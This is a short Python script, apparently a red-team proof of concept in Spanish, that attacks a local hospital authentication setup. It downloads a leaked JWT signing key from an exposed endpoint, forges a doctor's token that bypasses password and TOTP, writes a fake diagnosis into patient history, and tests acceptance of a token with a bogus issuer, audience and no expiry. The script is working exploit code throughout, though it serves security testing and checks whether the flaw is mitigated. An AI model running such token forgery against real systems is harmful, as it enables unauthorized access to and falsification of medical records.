import time
import requests
from authlib.jose import jwt

AS, RS = "http://localhost:8000", "http://localhost:8001"

r = requests.get(f"{AS}/.well-known/jwt-key")
if r.status_code != 200:
    print(f"[-] /.well-known/jwt-key -> HTTP {r.status_code}: la clave ya no está expuesta. Ataque mitigado.")
    raise SystemExit(0)

cfg = r.json()
print("[+] Clave filtrada:", cfg)

# 1. Token de médico sin usuario, contraseña ni TOTP
now = int(time.time())
token = jwt.encode(
    {"alg": "HS256"},
    {"iss": AS, "sub": "dr_gasca", "aud": "hospital-web",
     "scope": "paciente:leer medico:escribir", "iat": now, "exp": now + 3600},
    cfg["key"],
).decode()
print("[+] JWT forjado:", token)

r = requests.post(f"{RS}/api/historial", json={"diagnostico": "FORJADO por Red Team"},
                  headers={"Authorization": f"Bearer {token}"})
print("[+] POST /api/historial ->", r.status_code, r.text.strip())

# 2. Token con emisor y audiencia falsos y sin caducidad
raro = jwt.encode(
    {"alg": "HS256"},
    {"iss": "http://evil.example", "sub": "x", "aud": "otra-app", "scope": "paciente:leer"},
    cfg["key"],
).decode()
r = requests.get(f"{RS}/api/historial", headers={"Authorization": f"Bearer {raro}"})
print("[+] iss/aud falsos y sin exp ->", r.status_code, r.text.strip())
